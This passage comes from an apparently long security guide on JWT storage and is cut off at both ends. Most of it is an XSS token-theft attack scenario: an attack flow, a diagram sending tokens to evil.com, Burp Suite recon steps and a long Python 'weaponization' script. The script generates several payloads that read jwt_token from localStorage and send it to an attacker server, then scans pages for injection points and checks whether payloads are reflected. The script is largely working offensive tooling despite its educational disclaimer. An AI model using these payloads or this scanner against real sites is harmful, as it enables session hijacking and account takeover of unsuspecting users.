- Incident response procedures required
- Regular security audits necessary

**Development Effort:**
- Proper CSP implementation requires significant refactoring
- Token refresh logic adds client complexity
- Security testing requires specialized expertise
- Documentation and training necessary
- Ongoing maintenance and updates required

**Cost Considerations:**
- SSL certificates and infrastructure
- Security monitoring and logging tools
- Performance overhead may require more resources
- Security audit and penetration testing costs
- Training and expertise development

---

## Real-World Attack Scenarios

### Scenario 1: XSS-Based Token Theft from Local Storage

#### Attack Flow

An attacker discovers a stored XSS vulnerability in a social media web application that stores JWT tokens in the browser's Local Storage. The application allows users to post comments but fails to properly sanitize HTML input.

**Step-by-step attack process:**

1. **Vulnerability Discovery**: The attacker identifies that user comments are rendered without proper HTML encoding, allowing script injection

2. **Malicious Payload Crafting**: The attacker creates a comment containing JavaScript that reads from Local Storage and exfiltrates the JWT token

3. **Payload Injection**: The attacker posts the malicious comment to a popular discussion thread

4. **Victim Interaction**: Legitimate users view the thread, causing the malicious script to execute in their browsers

5. **Token Extraction**: The malicious script accesses `localStorage.getItem('jwt_token')` to retrieve the victim's authentication token

6. **Token Exfiltration**: The script sends the stolen token to an attacker-controlled server via an HTTP request or by encoding it in an image URL

7. **Token Replay**: The attacker uses the stolen token in the Authorization header of API requests to impersonate the victim

8. **Unauthorized Access**: The attacker gains full access to the victim's account, including private messages, personal data, and ability to perform actions as the victim

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant VS as Vulnerable Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>VS: POST malicious comment with XSS payload
    Note over A,VS: Payload contains script tag that<br/>fetches localStorage JWT to evil.com
    VS->>VS: Store comment without sanitization
    
    V->>VS: GET page with comments
    VS->>V: Return page with malicious script
    Note over V: JWT stored in localStorage
    
    V->>V: Browser executes injected script
    V->>V: Script reads JWT from localStorage
    V->>AS: Send token to attacker server
    Note over V,AS: GET evil.com?token=eyJhbG...
    
    AS->>A: Attacker receives stolen token
    
    A->>API: Request with stolen token
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>API: Validate token signature
    API->>A: Return victim's private data
    
    A->>API: Perform actions as victim
    Note over A,API: POST /api/transfer-money
    API->>A: Action successful
```

#### Reconnaissance tools and Weaponization code

**Reconnaissance (Information Gathering):**

The primary tool for reconnaissance in XSS-based token theft attacks is **Burp Suite** with its **Active Scanner** and **DOM Invader** extensions. Burp Suite is an integrated platform for performing security testing of web applications, and its Active Scanner module automatically probes for XSS vulnerabilities by injecting various payloads into input fields, URL parameters, and HTTP headers. DOM Invader is a browser extension specifically designed for testing DOM-based XSS vulnerabilities by analyzing how client-side JavaScript processes user input.

**Reconnaissance Steps with Burp Suite:**
1. Configure browser to use Burp Suite as a proxy
2. Enable "Intercept" mode and navigate through the target application
3. Use the Spider module to crawl and map all endpoints
4. Run Active Scanner on discovered endpoints to identify XSS injection points
5. Use DOM Invader to test for DOM-based XSS by monitoring sink and source interactions
6. Review the scan results to identify parameters vulnerable to XSS injection
7. Note the context of each XSS vulnerability (HTML, JavaScript, attribute, etc.)

**Weaponization Python Script:**

```python
#!/usr/bin/env python3
"""
XSS Token Theft Simulation Script
WARNING: For educational and authorized testing purposes only.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote
import argparse
import logging

# Configure logging for visibility
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def generate_xss_payloads(attacker_server: str) -> list:
    """
    Generate various XSS payloads designed to steal JWT tokens from localStorage.
    Each payload attempts to exfiltrate the token to the attacker's server.
    """
    # Base64-encoded version of the exfiltration logic for obfuscation
    payloads = [
        # Basic script tag injection - simplest form
        f'<script>fetch("{attacker_server}/steal?token="+localStorage.getItem("jwt_token"))</script>',
        
        # Image tag with onerror handler - bypasses some filters that block <script>
        f'<img src=x onerror="fetch(\'{attacker_server}/steal?token=\'+localStorage.getItem(\'jwt_token\'))">',
        
        # SVG onload event - alternative vector for CSP bypass attempts
        f'<svg onload="new Image().src=\'{attacker_server}/steal?t=\'+btoa(localStorage.getItem(\'jwt_token\'))">',
        
        # JavaScript URL scheme in anchor tag - useful for stored XSS in links
        f'<a href="javascript:fetch(\'{attacker_server}/steal?token=\'+localStorage.getItem(\'jwt_token\'))">Click</a>',
        
        # Event handler in input field - triggers on user interaction
        f'<input onfocus="fetch(\'{attacker_server}/steal?token=\'+localStorage.getItem(\'jwt_token\'))" autofocus>',
        
        # Body onload event - executes when page loads
        f'<body onload="fetch(\'{attacker_server}/steal?token=\'+localStorage.getItem(\'jwt_token\'))">',
        
        # Advanced payload with multiple storage checks
        f'''<script>
            var t = localStorage.getItem("jwt_token") || 
                    localStorage.getItem("access_token") || 
                    sessionStorage.getItem("token");
            if(t) {{ fetch("{attacker_server}/steal?token="+encodeURIComponent(t)); }}
        </script>''',
    ]
    return payloads


# =============================================================================
# MODULAR INJECTION POINT DETECTION FUNCTIONS
# Each function targets a specific category of entry points
# =============================================================================

def find_form_injection_points(soup: BeautifulSoup, target_url: str) -> list:
    """
    Category 1: Form-based injection points.
    Extracts all forms and their input fields that could be vulnerable to XSS.
    """
    injection_points = []
    
    forms = soup.find_all('form')
    for form in forms:
        form_data = {
            'type': 'form',
            'action': urljoin(target_url, form.get('action', '')),
            'method': form.get('method', 'get').upper(),
            'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
            'inputs': []
        }
        
        # Extract all input fields from the form
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            
            # Skip submit fields but include hidden for CSRF analysis
            if input_name and input_type not in ['submit']:
                form_data['inputs'].append({
                    'name': input_name,
                    'type': input_type,
                    'id': input_tag.get('id', ''),
                    'value': input_tag.get('value', ''),
                    'injectable': input_type not in ['hidden', 'password', 'file']
                })
        
        if form_data['inputs']:
            injection_points.append(form_data)
            logger.info(f"[FORMS] Found form at {form_data['action']} with {len(form_data['inputs'])} inputs")
    
    return injection_points


def find_url_parameter_injection_points(target_url: str, soup: BeautifulSoup) -> list:
    """
    Category 2: URL parameter injection points.
    Identifies query string parameters and path segments that could be reflected.
    """
    from urllib.parse import urlparse, parse_qs
    injection_points = []
    
    # Parse current URL for existing parameters
    parsed = urlparse(target_url)
    if parsed.query:
        params = parse_qs(parsed.query)
        for param_name, param_values in params.items():
            injection_points.append({
                'type': 'url_parameter',
                'name': param_name,
                'current_value': param_values[0] if param_values else '',
                'url': target_url,
                'risk': 'high'  # Parameters in URL are often reflected
            })
            logger.info(f"[URL_PARAMS] Found parameter: {param_name}")
    
    # Find all links with query parameters on the page
    for link in soup.find_all('a', href=True):
        href = link.get('href', '')
        full_url = urljoin(target_url, href)
        link_parsed = urlparse(full_url)
        
        if link_parsed.query:
            params = parse_qs(link_parsed.query)
            for param_name in params.keys():
                injection_points.append({
                    'type': 'url_parameter',
                    'name': param_name,
                    'source': 'link',
                    'url': full_url,
                    'risk': 'medium'
                })
    
    # Look for dynamic path segments (e.g., /user/123/profile)
    path_segments = [seg for seg in parsed.path.split('/') if seg]
    for i, segment in enumerate(path_segments):
        if segment.isdigit() or len(segment) > 20:  # Likely dynamic content
            injection_points.append({
                'type': 'path_segment',
                'position': i,
                'value': segment,
                'url': target_url,
                'risk': 'medium'
            })
            logger.info(f"[PATH] Found dynamic path segment: {segment}")
    
    return injection_points


def find_header_injection_points(response_headers: dict) -> list:
    """
    Category 3: HTTP header injection points.
    Identifies headers that might be reflected in responses or logged.
    """
    injection_points = []
    
    # Headers commonly reflected or logged
    injectable_headers = [
        ('User-Agent', 'high', 'Often logged and displayed in analytics'),
        ('Referer', 'high', 'Frequently reflected in error pages'),
        ('X-Forwarded-For', 'medium', 'May be logged or displayed'),
        ('X-Forwarded-Host', 'medium', 'Used in redirects'),
        ('Accept-Language', 'low', 'Sometimes reflected in localization'),
        ('Cookie', 'high', 'Values may be reflected'),
        ('Origin', 'medium', 'Used in CORS responses'),
        ('Host', 'high', 'Can cause host header injection'),
    ]
    
    for header_name, risk, description in injectable_headers:
        injection_points.append({
            'type': 'http_header',
            'header': header_name,
            'risk': risk,
            'description': description,
            'test_value': f'<script>alert("{header_name}")</script>'
        })
        logger.info(f"[HEADERS] Injectable header: {header_name} (Risk: {risk})")
    
    # Check if any response headers indicate reflection
    reflection_indicators = ['X-Debug', 'X-Request-Id', 'X-Trace']
    for indicator in reflection_indicators:
        if indicator.lower() in [h.lower() for h in response_headers.keys()]:
            injection_points.append({
                'type': 'http_header',
                'header': indicator,
                'risk': 'high',
                'description': 'Debug header present - may reflect input'
            })
    
    return injection_points


def find_event_handler_injection_points(soup: BeautifulSoup) -> list:
    """
    Category 4: DOM event handler injection points.
    Identifies elements with inline event handlers that could be exploited.
    """
    injection_points = []
    
    # All possible JavaScript event handlers
    event_handlers = [
        'onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover',
        'onmousemove', 'onmouseout', 'onmouseenter', 'onmouseleave',
        'onkeydown', 'onkeyup', 'onkeypress',
        'onfocus', 'onblur', 'onchange', 'oninput', 'onsubmit', 'onreset',
        'onload', 'onunload', 'onerror', 'onabort',
        'onscroll', 'onresize', 'onhashchange',
        'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover',
        'ondragstart', 'ondrop',
        'oncopy', 'oncut', 'onpaste',
        'onanimationstart', 'onanimationend', 'onanimationiteration',
        'ontransitionend', 'ontouchstart', 'ontouchend', 'ontouchmove'
    ]
    
    for handler in event_handlers:
        for elem in soup.find_all(attrs={handler: True}):
            handler_code = elem.get(handler, '')
            injection_points.append({
                'type': 'event_handler',
                'element': elem.name,
                'element_id': elem.get('id', ''),
                'element_class': elem.get('class', []),
                'handler': handler,
                'code': handler_code[:200],
                'risk': 'high' if 'eval' in handler_code or 'innerHTML' in handler_code else 'medium'
            })
            logger.info(f"[EVENTS] Found {handler} on <{elem.name}>")
    
    return injection_points


def find_websocket_injection_points(soup: BeautifulSoup, html_content: str) -> list:
    """
    Category 5: WebSocket injection points.
    Identifies WebSocket connections that could be vulnerable to message injection.
    """
    import re
    injection_points = []
    
    # Look for WebSocket patterns in scripts
    ws_patterns = [
        r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)[\'"]',
        r'io\s*\(\s*[\'"]([^\'"]+)[\'"]',  # Socket.io
        r'SockJS\s*\(\s*[\'"]([^\'"]+)[\'"]',
        r'Stomp\.client\s*\(\s*[\'"]([^\'"]+)[\'"]',
    ]
    
    for pattern in ws_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            injection_points.append({
                'type': 'websocket',
                'url': match,
                'protocol': 'wss' if 'wss://' in match else 'ws',
                'risk': 'high',
                'description': 'WebSocket connection - messages may be injectable'
            })
            logger.info(f"[WEBSOCKET] Found WebSocket connection: {match}")
    
    # Look for message handlers
    message_patterns = [
        r'\.onmessage\s*=',
        r'\.addEventListener\s*\(\s*[\'"]message[\'"]',
        r'socket\.on\s*\(\s*[\'"]',
    ]
    
    for pattern in message_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            injection_points.append({
                'type': 'websocket_handler',
                'pattern': pattern,
                'risk': 'high',
                'description': 'WebSocket message handler found'
            })
    
    return injection_points


def find_file_upload_injection_points(soup: BeautifulSoup) -> list:
    """
    Category 6: File upload injection points.
    Identifies file upload fields that could be exploited for XSS via filename or content.
    """
    injection_points = []
    
    # Find file input elements
    for file_input in soup.find_all('input', {'type': 'file'}):
        # Check accepted file types
        accept = file_input.get('accept', '')
        
        injection_points.append({
            'type': 'file_upload',
            'name': file_input.get('name', ''),
            'id': file_input.get('id', ''),
            'accept': accept,
            'multiple': file_input.has_attr('multiple'),
            'vectors': [],
            'risk': 'high' if not accept or 'svg' in accept or 'html' in accept else 'medium'
        })
        
        # Determine specific attack vectors
        vectors = []
        if not accept or '*' in accept:
            vectors.extend(['svg_xss', 'html_upload', 'filename_xss'])
        if 'svg' in accept or 'image/svg' in accept:
            vectors.append('svg_xss')
        if 'html' in accept or 'text/html' in accept:
            vectors.append('html_upload')
        if 'xml' in accept:
            vectors.append('xxe')
        
        injection_points[-1]['vectors'] = vectors
        logger.info(f"[FILE_UPLOAD] Found file input: {file_input.get('name', 'unnamed')}")
    
    return injection_points


def find_postmessage_injection_points(html_content: str) -> list:
    """
    Category 7: postMessage injection points.
    Identifies window.postMessage handlers that could be vulnerable to DOM XSS.
    """
    import re
    injection_points = []
    
    # Look for postMessage listeners
    listener_patterns = [
        r'addEventListener\s*\(\s*[\'"]message[\'"]',
        r'onmessage\s*=',
        r'window\.onmessage',
    ]
    
    for pattern in listener_patterns:
        matches = re.finditer(pattern, html_content, re.IGNORECASE)
        for match in matches:
            # Extract surrounding context
            start = max(0, match.start() - 100)
            end = min(len(html_content), match.end() + 300)
            context = html_content[start:end]
            
            # Check for origin validation
            has_origin_check = bool(re.search(r'origin\s*[!=]==', context, re.IGNORECASE))
            
            injection_points.append({
                'type': 'postmessage',
                'pattern': pattern,
                'has_origin_validation': has_origin_check,
                'risk': 'low' if has_origin_check else 'critical',
                'context_snippet': context[:150],
                'description': 'postMessage handler - vulnerable if no origin check'
            })
            logger.info(f"[POSTMESSAGE] Found message listener (origin check: {has_origin_check})")
    
    # Look for postMessage calls (potential targets)
    send_patterns = [
        r'\.postMessage\s*\(',
        r'window\.parent\.postMessage',
        r'window\.opener\.postMessage',
    ]
    
    for pattern in send_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            injection_points.append({
                'type': 'postmessage_sender',
                'pattern': pattern,
                'risk': 'medium',
                'description': 'Page sends postMessage - may accept messages too'
            })
    
    return injection_points


def find_template_injection_points(soup: BeautifulSoup, html_content: str) -> list:
    """
    Category 8: Template injection points.
    Identifies client-side and server-side template syntax that could be exploited.
    """
    import re
    injection_points = []
    
    # Client-side template patterns
    template_patterns = [
        (r'\{\{\s*[^}]+\s*\}\}', 'angular/vue', 'high'),
        (r'\[\[\s*[^\]]+\s*\]\]', 'polymer', 'high'),
        (r'v-html\s*=', 'vue_v-html', 'critical'),
        (r'ng-bind-html', 'angular_bind', 'critical'),
        (r'\$\{[^}]+\}', 'template_literal', 'medium'),
        (r'dangerouslySetInnerHTML', 'react_dangerous', 'critical'),
        (r'\.innerHTML\s*=', 'innerHTML', 'critical'),
        (r'\.outerHTML\s*=', 'outerHTML', 'critical'),
        (r'document\.write\s*\(', 'document_write', 'critical'),
        (r'\.insertAdjacentHTML\s*\(', 'insertAdjacentHTML', 'high'),
    ]
    
    for pattern, template_type, risk in template_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        if matches:
            injection_points.append({
                'type': 'template',
                'template_type': template_type,
                'pattern': pattern,
                'occurrences': len(matches),
                'samples': matches[:3],  # First 3 examples
                'risk': risk
            })
            logger.info(f"[TEMPLATE] Found {template_type} pattern ({len(matches)} occurrences)")
    
    # Server-side template indicators (reflected from response)
    server_patterns = [
        (r'<%[^%]*%>', 'jsp/asp', 'high'),
        (r'\{%[^%]*%\}', 'jinja/django', 'high'),
        (r'#\{[^}]*\}', 'ruby/java_el', 'high'),
        (r'\$\{[^}]*\}', 'freemarker/jsp_el', 'high'),
    ]
    
    for pattern, template_type, risk in server_patterns:
        if re.search(pattern, html_content):
            injection_points.append({
                'type': 'server_template',
                'template_type': template_type,
                'risk': risk,
                'description': f'Server-side {template_type} template detected'
            })
    
    return injection_points


def find_api_endpoint_injection_points(soup: BeautifulSoup, html_content: str) -> list:
    """
    Category 9: API endpoint injection points.
    Identifies AJAX/fetch calls and API endpoints that could reflect input.
    """
    import re
    injection_points = []
    
    # Look for fetch/XHR patterns
    api_patterns = [
        (r'fetch\s*\(\s*[\'"]([^\'"]+)[\'"]', 'fetch'),
        (r'axios\.[a-z]+\s*\(\s*[\'"]([^\'"]+)[\'"]', 'axios'),
        (r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*[\'"]([^\'"]+)[\'"]', 'jquery_ajax'),
        (r'XMLHttpRequest[^;]*\.open\s*\([^,]+,\s*[\'"]([^\'"]+)[\'"]', 'xhr'),
        (r'\/api\/[a-zA-Z0-9_\/\-]+', 'api_path'),
        (r'\/v[0-9]+\/[a-zA-Z0-9_\/\-]+', 'versioned_api'),
    ]
    
    for pattern, api_type in api_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            injection_points.append({
                'type': 'api_endpoint',
                'endpoint': match,
                'api_type': api_type,
                'risk': 'high' if 'user' in match.lower() or 'search' in match.lower() else 'medium'
            })
            logger.info(f"[API] Found {api_type} endpoint: {match}")
    
    # Look for data attributes that might contain API URLs
    for elem in soup.find_all(attrs={'data-url': True}):
        injection_points.append({
            'type': 'api_endpoint',
            'endpoint': elem.get('data-url'),
            'source': 'data-attribute',
            'element': elem.name,
            'risk': 'medium'
        })
    
    for elem in soup.find_all(attrs={'data-api': True}):
        injection_points.append({
            'type': 'api_endpoint',
            'endpoint': elem.get('data-api'),
            'source': 'data-attribute',
            'risk': 'medium'
        })
    
    return injection_points


def find_fragment_injection_points(html_content: str) -> list:
    """
    Category 10: URL fragment/hash injection points.
    Identifies JavaScript that processes location.hash for potential DOM XSS.
    """
    import re
    injection_points = []
    
    # Patterns that read from location.hash
    hash_patterns = [
        (r'location\.hash', 'location.hash access'),
        (r'window\.location\.hash', 'window.location.hash access'),
        (r'document\.location\.hash', 'document.location.hash access'),
        (r'\.split\s*\(\s*[\'"]#[\'"]', 'hash splitting'),
        (r'hashchange', 'hashchange event'),
    ]
    
    for pattern, description in hash_patterns:
        matches = re.finditer(pattern, html_content, re.IGNORECASE)
        for match in matches:
            # Check if hash value is used dangerously
            start = match.start()
            end = min(len(html_content), match.end() + 200)
            context = html_content[start:end]
            
            dangerous_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval', 'setTimeout', 'setInterval']
            is_dangerous = any(sink in context for sink in dangerous_sinks)
            
            injection_points.append({
                'type': 'fragment',
                'pattern': description,
                'context_snippet': context[:150],
                'dangerous_sink_nearby': is_dangerous,
                'risk': 'critical' if is_dangerous else 'high'
            })
            logger.info(f"[FRAGMENT] Found {description} (dangerous: {is_dangerous})")
    
    return injection_points


def find_storage_injection_points(html_content: str) -> list:
    """
    Category 11: Browser storage injection points.
    Identifies code that reads from localStorage/sessionStorage and renders unsafely.
    """
    import re
    injection_points = []
    
    # Storage access patterns
    storage_patterns = [
        (r'localStorage\.getItem\s*\(\s*[\'"]([^\'"]+)[\'"]', 'localStorage'),
        (r'sessionStorage\.getItem\s*\(\s*[\'"]([^\'"]+)[\'"]', 'sessionStorage'),
        (r'localStorage\[[\'"]([^\'"]+)[\'"]\]', 'localStorage_bracket'),
        (r'sessionStorage\[[\'"]([^\'"]+)[\'"]\]', 'sessionStorage_bracket'),
    ]
    
    for pattern, storage_type in storage_patterns:
        matches = re.finditer(pattern, html_content, re.IGNORECASE)
        for match in matches:
            key_name = match.group(1) if match.groups() else 'unknown'
            
            # Check if result is rendered unsafely
            start = match.start()
            end = min(len(html_content), match.end() + 150)
            context = html_content[start:end]
            
            dangerous = any(s in context for s in ['innerHTML', 'document.write', 'outerHTML'])
            
            injection_points.append({
                'type': 'storage',
                'storage_type': storage_type,
                'key': key_name,
                'rendered_unsafely': dangerous,
                'risk': 'critical' if dangerous else 'medium',
                'description': f'Data from {storage_type} may be rendered without sanitization'
            })
            logger.info(f"[STORAGE] Found {storage_type} access: {key_name}")
    
    return injection_points


def find_injection_points(target_url: str, session: requests.Session) -> dict:
    """
    Master function to find ALL potential XSS injection points.
    Orchestrates all category-specific detection functions.
    Returns a comprehensive dictionary of all entry points organized by category.
    """
    from urllib.parse import urlparse, parse_qs
    
    all_injection_points = {
        'forms': [],
        'url_parameters': [],
        'headers': [],
        'event_handlers': [],
        'websockets': [],
        'file_uploads': [],
        'postmessage': [],
        'templates': [],
        'api_endpoints': [],
        'fragments': [],
        'storage': [],
        'summary': {}
    }
    
    try:
        # Fetch the target page content
        response = session.get(target_url, timeout=10)
        response.raise_for_status()
        html_content = response.text
        
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Run all category-specific detection functions
        all_injection_points['forms'] = find_form_injection_points(soup, target_url)
        all_injection_points['url_parameters'] = find_url_parameter_injection_points(target_url, soup)
        all_injection_points['headers'] = find_header_injection_points(dict(response.headers))
        all_injection_points['event_handlers'] = find_event_handler_injection_points(soup)
        all_injection_points['websockets'] = find_websocket_injection_points(soup, html_content)
        all_injection_points['file_uploads'] = find_file_upload_injection_points(soup)
        all_injection_points['postmessage'] = find_postmessage_injection_points(html_content)
        all_injection_points['templates'] = find_template_injection_points(soup, html_content)
        all_injection_points['api_endpoints'] = find_api_endpoint_injection_points(soup, html_content)
        all_injection_points['fragments'] = find_fragment_injection_points(html_content)
        all_injection_points['storage'] = find_storage_injection_points(html_content)
        
        # Generate summary
        all_injection_points['summary'] = {
            'total_forms': len(all_injection_points['forms']),
            'total_url_params': len(all_injection_points['url_parameters']),
            'total_headers': len(all_injection_points['headers']),
            'total_event_handlers': len(all_injection_points['event_handlers']),
            'total_websockets': len(all_injection_points['websockets']),
            'total_file_uploads': len(all_injection_points['file_uploads']),
            'total_postmessage': len(all_injection_points['postmessage']),
            'total_templates': len(all_injection_points['templates']),
            'total_api_endpoints': len(all_injection_points['api_endpoints']),
            'total_fragments': len(all_injection_points['fragments']),
            'total_storage': len(all_injection_points['storage']),
        }
        all_injection_points['summary']['grand_total'] = sum(all_injection_points['summary'].values())
        
        logger.info(f"=== INJECTION POINT SUMMARY ===")
        for category, count in all_injection_points['summary'].items():
            logger.info(f"  {category}: {count}")
        
    except requests.RequestException as e:
        logger.error(f"Error fetching target page: {e}")
    
    return all_injection_points


# =============================================================================
# MULTI-METHOD XSS VULNERABILITY TESTING FUNCTIONS
# Multiple detection techniques for comprehensive vulnerability assessment
# =============================================================================

def detect_exact_reflection(payload: str, response_text: str) -> dict:
    """
    Method 1: Exact payload reflection detection.
    Checks if the exact payload appears unchanged in the response.
    """
    result = {'method': 'exact_reflection', 'detected': False, 'confidence': 'low'}
    
    if payload in response_text:
        result['detected'] = True
        result['confidence'] = 'high'
        result['details'] = 'Exact payload found in response'
    
    return result


def detect_url_encoded_reflection(payload: str, response_text: str) -> dict:
    """
    Method 2: URL-encoded payload reflection detection.
    Checks for URL-encoded versions of the payload.
    """
    from urllib.parse import quote, quote_plus
    result = {'method': 'url_encoded_reflection', 'detected': False, 'confidence': 'low'}
    
    encoded_variants = [
        quote(payload),
        quote_plus(payload),
        quote(payload, safe=''),
        payload.replace('<', '%3C').replace('>', '%3E'),
        payload.replace('<', '%3c').replace('>', '%3e'),
    ]
    
    for variant in encoded_variants:
        if variant in response_text:
            result['detected'] = True
            result['confidence'] = 'medium'
            result['details'] = f'URL-encoded variant found: {variant[:50]}...'
            break
    
    return result


def detect_html_entity_reflection(payload: str, response_text: str) -> dict:
    """
    Method 3: HTML entity encoded reflection detection.
    Checks for HTML entity encoded versions indicating partial sanitization.
    """
    import html
    result = {'method': 'html_entity_reflection', 'detected': False, 'confidence': 'low'}
    
    # Common HTML entity encodings
    entity_variants = [
        html.escape(payload),
        payload.replace('<', '&lt;').replace('>', '&gt;'),
        payload.replace('<', '&#60;').replace('>', '&#62;'),
        payload.replace('<', '&#x3C;').replace('>', '&#x3E;'),
        payload.replace('"', '&quot;').replace("'", '&#39;'),
    ]
    
    for variant in entity_variants:
        if variant in response_text:
            result['detected'] = True
            result['confidence'] = 'low'  # Encoded = sanitized, but worth noting
            result['details'] = f'HTML-encoded variant found (sanitization detected)'
            result['sanitization_detected'] = True
            break
    
    return result


def detect_case_variation_reflection(payload: str, response_text: str) -> dict:
    """
    Method 4: Case-insensitive and case-variation reflection detection.
    Checks for case-modified versions of the payload.
    """
    result = {'method': 'case_variation', 'detected': False, 'confidence': 'low'}
    
    # Check case-insensitive
    if payload.lower() in response_text.lower():
        result['detected'] = True
        result['confidence'] = 'medium'
        result['details'] = 'Case-insensitive match found'
    
    # Check for common case transformations
    case_variants = [
        payload.upper(),
        payload.lower(),
        payload.title(),
        payload.swapcase(),
    ]
    
    for variant in case_variants:
        if variant in response_text and variant != payload:
            result['detected'] = True
            result['confidence'] = 'medium'
            result['details'] = f'Case-transformed variant found'
            break
    
    return result


def detect_partial_reflection(payload: str, response_text: str) -> dict:
    """
    Method 5: Partial payload reflection detection.
    Checks if parts of the payload are reflected (filter bypass opportunities).
    """
    import re
    result = {'method': 'partial_reflection', 'detected': False, 'confidence': 'low', 'reflected_parts': []}
    
    # Split payload into significant parts
    significant_parts = [
        '<script>', '</script>', 'javascript:', 'onerror=', 'onload=',
        'onclick=', 'alert(', 'eval(', 'fetch(', 'document.cookie',
        'localStorage', 'sessionStorage', '.getItem('
    ]
    
    for part in significant_parts:
        if part.lower() in payload.lower() and part.lower() in response_text.lower():
            result['reflected_parts'].append(part)
    
    if result['reflected_parts']:
        result['detected'] = True
        result['confidence'] = 'medium'
        result['details'] = f"Partial reflection: {', '.join(result['reflected_parts'])}"
    
    return result


def detect_context_aware_reflection(payload: str, response_text: str) -> dict:
    """
    Method 6: Context-aware injection detection.
    Analyzes HTML context where payload appears to determine exploitability.
    """
    import re
    result = {
        'method': 'context_aware', 
        'detected': False, 
        'confidence': 'low',
        'contexts': []
    }
    
    if payload not in response_text:
        return result
    
    # Find all occurrences and analyze context
    index = 0
    while True:
        index = response_text.find(payload, index)
        if index == -1:
            break
        
        # Get surrounding context (500 chars before and after)
        start = max(0, index - 500)
        end = min(len(response_text), index + len(payload) + 500)
        context = response_text[start:end]
        
        context_info = {'position': index, 'exploitable': False, 'type': 'unknown'}
        
        # Check various contexts
        if re.search(r'<script[^>]*>.*' + re.escape(payload), context, re.DOTALL | re.IGNORECASE):
            context_info['type'] = 'inside_script'
            context_info['exploitable'] = True
        elif re.search(r'<[^>]+\s+\w+=["\'].*' + re.escape(payload), context, re.IGNORECASE):
            context_info['type'] = 'inside_attribute'
            context_info['exploitable'] = True
        elif re.search(r'<!--.*' + re.escape(payload), context, re.DOTALL):
            context_info['type'] = 'inside_comment'
            context_info['exploitable'] = False
        elif re.search(r'<style[^>]*>.*' + re.escape(payload), context, re.DOTALL | re.IGNORECASE):
            context_info['type'] = 'inside_style'
            context_info['exploitable'] = True
        else:
            context_info['type'] = 'html_body'
            context_info['exploitable'] = True
        
        result['contexts'].append(context_info)
        index += 1
    
    if result['contexts']:
        result['detected'] = True
        exploitable = any(c['exploitable'] for c in result['contexts'])
        result['confidence'] = 'high' if exploitable else 'low'
        result['details'] = f"Found in {len(result['contexts'])} location(s)"
    
    return result


def detect_error_based_reflection(payload: str, response: 'requests.Response') -> dict:
    """
    Method 7: Error-based detection.
    Analyzes error messages that might reveal injection success.
    """
    result = {'method': 'error_based', 'detected': False, 'confidence': 'low'}
    
    # Check for JavaScript syntax errors (indicates code execution attempt)
    js_error_patterns = [
        r'SyntaxError',
        r'Uncaught.*Error',
        r'unexpected.*token',
        r'unterminated.*string',
        r'invalid.*character',
    ]
    
    import re
    for pattern in js_error_patterns:
        if re.search(pattern, response.text, re.IGNORECASE):
            result['detected'] = True
            result['confidence'] = 'medium'
            result['details'] = f'JavaScript error pattern found: {pattern}'
            result['error_type'] = 'javascript'
            break
    
    # Check for server errors that might indicate processing
    if response.status_code >= 500:
        result['detected'] = True
        result['confidence'] = 'low'
        result['details'] = f'Server error {response.status_code} - payload may have caused issues'
        result['error_type'] = 'server'
    
    return result


def detect_timing_based_reflection(payload: str, response: 'requests.Response', 
                                    baseline_time: float = None) -> dict:
    """
    Method 8: Timing-based detection.
    Analyzes response time differences that might indicate payload processing.
    """
    result = {'method': 'timing_based', 'detected': False, 'confidence': 'low'}
    
    response_time = response.elapsed.total_seconds()
    
    if baseline_time:
        # If response takes significantly longer, payload might be processed
        time_diff = response_time - baseline_time
        if time_diff > 2.0:  # 2+ seconds difference
            result['detected'] = True
            result['confidence'] = 'low'
            result['details'] = f'Response {time_diff:.2f}s slower than baseline'
            result['time_difference'] = time_diff
    
    # Check for extremely slow responses (possible infinite loop/recursion)
    if response_time > 10.0:
        result['detected'] = True
        result['confidence'] = 'medium'
        result['details'] = f'Very slow response ({response_time:.2f}s) - possible DoS vector'
    
    return result


def detect_dom_pattern_indicators(response_text: str) -> dict:
    """
    Method 9: DOM pattern detection.
    Identifies patterns that indicate DOM-based XSS vulnerabilities.
    """
    import re
    result = {
        'method': 'dom_patterns', 
        'detected': False, 
        'confidence': 'low',
        'vulnerable_patterns': []
    }
    
    # Dangerous DOM sink patterns
    dangerous_patterns = [
        (r'\.innerHTML\s*=\s*[^;]*\b(location|document\.URL|document\.referrer|window\.name)', 'innerHTML with tainted source'),
        (r'\.outerHTML\s*=\s*[^;]*\b(location|document\.URL)', 'outerHTML with tainted source'),
        (r'document\.write\s*\([^)]*\b(location|document\.URL)', 'document.write with tainted source'),
        (r'eval\s*\([^)]*\b(location|document\.URL|window\.name)', 'eval with tainted source'),
        (r'setTimeout\s*\([^)]*\b(location|document\.URL)', 'setTimeout with tainted source'),
        (r'setInterval\s*\([^)]*\b(location|document\.URL)', 'setInterval with tainted source'),
        (r'location\.hash[^}]*innerHTML', 'location.hash to innerHTML'),
        (r'decodeURIComponent\s*\([^)]*location', 'decodeURIComponent with location'),
        (r'\$\([^)]*\)\.html\s*\([^)]*location', 'jQuery .html() with location'),
        (r'\.append\s*\([^)]*location\.hash', 'append with location.hash'),
    ]
    
    for pattern, description in dangerous_patterns:
        matches = re.findall(pattern, response_text, re.IGNORECASE)
        if matches:
            result['vulnerable_patterns'].append({
                'pattern': description,
                'occurrences': len(matches)
            })
    
    if result['vulnerable_patterns']:
        result['detected'] = True
        result['confidence'] = 'high'
